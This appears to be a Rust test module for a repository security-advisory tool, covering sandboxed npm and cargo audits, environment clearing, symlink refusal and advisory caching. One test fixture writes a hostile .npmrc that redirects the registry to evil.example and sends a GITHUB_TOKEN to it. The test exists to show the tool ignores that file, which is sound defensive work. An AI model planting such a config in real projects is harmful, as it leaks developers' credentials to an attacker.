        assert_eq!(std::fs::read_dir(&plan.cwd).unwrap().count(), 0);
        assert_eq!(env_keys(&plan), vec!["PATH", "HOME", "CARGO_HOME"]);
        assert!(plan
            .env
            .contains(&("CARGO_HOME".into(), "/home/u/.cargo".into())));

        // The built command clears the inherited environment.
        let cmd = plan.command();
        assert_eq!(cmd.get_current_dir(), Some(sandbox.path()));
        let envs: Vec<_> = cmd.get_envs().map(|(k, _)| k.to_owned()).collect();
        assert_eq!(envs.len(), 3);
    }

    #[test]
    fn npm_plan_audits_a_staged_copy_with_pinned_config() {
        let repo = tempfile::tempdir().unwrap();
        std::fs::write(
            repo.path().join("package-lock.json"),
            "{\"lockfileVersion\":3}",
        )
        .unwrap();
        std::fs::write(repo.path().join("package.json"), "{}").unwrap();
        std::fs::write(
            repo.path().join(".npmrc"),
            "registry=https://evil.example/\n//evil.example/:_authToken=${GITHUB_TOKEN}\n",
        )
        .unwrap();
        let sandbox = Sandbox::new().unwrap();
        stage_npm(repo.path(), sandbox.path()).unwrap();
        let mut staged: Vec<String> = std::fs::read_dir(sandbox.path())
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
            .collect();
        staged.sort();
        assert_eq!(
            staged,
            vec![EMPTY_NPMRC, "package-lock.json", "package.json"]
        );
        assert_eq!(
            std::fs::read_to_string(sandbox.path().join(EMPTY_NPMRC)).unwrap(),
            ""
        );

        let plan = npm_audit_plan(Path::new("/usr/bin/npm"), sandbox.path(), hostile_env);
        assert_eq!(plan.cwd, sandbox.path());
        assert!(!plan.cwd.starts_with(repo.path()));
        let args: Vec<String> = plan
            .args
            .iter()
            .map(|a| a.to_string_lossy().into_owned())
            .collect();
        let rc = sandbox
            .path()
            .join(EMPTY_NPMRC)
            .to_string_lossy()
            .into_owned();
        assert!(args.contains(&"--registry=https://registry.npmjs.org/".to_string()));
        assert!(args.contains(&format!("--userconfig={rc}")));
        assert!(args.contains(&format!("--globalconfig={rc}")));
        assert_eq!(env_keys(&plan), vec!["PATH", "HOME"]);
        assert!(plan
            .env
            .contains(&("HOME".into(), sandbox.path().as_os_str().to_owned())));
    }

    #[test]
    fn npm_staging_refuses_a_missing_or_symlinked_lockfile() {
        let repo = tempfile::tempdir().unwrap();
        let sandbox = Sandbox::new().unwrap();
        assert!(stage_npm(repo.path(), sandbox.path()).is_err());

        let outside = tempfile::tempdir().unwrap();
        std::fs::write(outside.path().join("secret"), "x").unwrap();
        std::os::unix::fs::symlink(
            outside.path().join("secret"),
            repo.path().join("package-lock.json"),
        )
        .unwrap();
        assert!(stage_npm(repo.path(), sandbox.path()).is_err());
    }

    #[test]
    fn sandbox_is_private_and_removed_on_drop() {
        use std::os::unix::fs::PermissionsExt;
        let sandbox = Sandbox::new().unwrap();
        let path = sandbox.path().to_path_buf();
        let mode = std::fs::metadata(&path).unwrap().permissions().mode();
        assert_eq!(mode & 0o777, 0o700);
        drop(sandbox);
        assert!(!path.exists());
    }

    #[test]
    fn local_audits_are_off_by_default() {
        let cfg = AppConfig::default();
        assert!(!cfg.local_audits);
        // Off → nothing runs, nothing is read or written.
        let repo = tempfile::tempdir().unwrap();
        std::fs::write(repo.path().join("Cargo.lock"), "").unwrap();
        let mut r = sample(&repo.path().to_string_lossy(), Host::Github, "", "");
        r.host = None;
        let out = refresh_local(&[r], &cfg, 0, true);
        assert_eq!((out.updated, out.errors), (0, 0));
        // An older config without the key also defaults to off.
        let parsed: AppConfig = toml::from_str("roots = []").unwrap();
        assert!(!parsed.local_audits);
    }

    fn mem() -> rusqlite::Connection {
        let conn = rusqlite::Connection::open_in_memory().unwrap();
        cache::init(&conn).unwrap();
        conn
    }

    #[test]
    fn errors_keep_the_cached_report_and_unavailable_is_cached() {
        let conn = mem();
        let counts = SeverityCounts {
            high: 2,
            ..Default::default()
        };
        let first = AdvisoryReport::ok(AdvisorySource::Dependabot, counts, 1_000);
        let out = apply_results_on(
            &conn,
            vec![Ok(("github.com".into(), "o/a".into(), first.clone()))],
        );
        assert_eq!(out.updated, 1);

        let out = apply_results_on(&conn, vec![Err("GitHub Dependabot 401".into())]);
        assert!(out.all_failed());
        let all = cache::all_advisories_on(&conn);
        assert_eq!(all[&("github.com".into(), "o/a".into())], first);

        let off = AdvisoryReport::unavailable(AdvisorySource::Dependabot, "no access", 2_000);
        apply_results_on(&conn, vec![Ok(("github.com".into(), "o/b".into(), off))]);
        let fresh = cache::fresh_advisory_keys_on(&conn, TTL_SECS, 2_000);
        assert!(fresh.contains(&("github.com".into(), "o/b".into())));
        assert!(fresh.contains(&("github.com".into(), "o/a".into())));
        assert!(cache::fresh_advisory_keys_on(&conn, 10, 5_000).is_empty());
    }

    #[test]
    fn facts_link_reports_to_fleet_repos() {
        let gh = sample("/gh", Host::Github, "github.com", "o/gh");
        let mut local = sample("/local", Host::Github, "", "");
        local.host = None;
        local.slug = None;
        let quiet = sample("/quiet", Host::Github, "github.com", "o/quiet");
        let mut reports = HashMap::new();
        reports.insert(
            ("github.com".to_string(), "o/gh".to_string()),
            AdvisoryReport::ok(
                AdvisorySource::Dependabot,
                SeverityCounts {
                    critical: 1,
                    ..Default::default()
                },
                0,
            ),
        );
        reports.insert(
            (LOCAL_HOST.to_string(), "/local".to_string()),
            AdvisoryReport::ok(
                AdvisorySource::CargoAudit,
                SeverityCounts {
                    low: 2,
                    ..Default::default()
                },
                0,
            ),
        );
        reports.insert(
            ("github.com".to_string(), "o/quiet".to_string()),
            AdvisoryReport::unavailable(AdvisorySource::Dependabot, "no access", 0),
        );
        let facts = facts(&reports, &[gh, local, quiet]);
        assert_eq!(facts.len(), 2);
        assert_eq!(facts[0].repo_id, "/gh");
        assert_eq!(facts[0].source, "Dependabot");
        assert_eq!(facts[1].repo_id, "/local");
        assert_eq!(facts[1].counts.low, 2);
    }
}
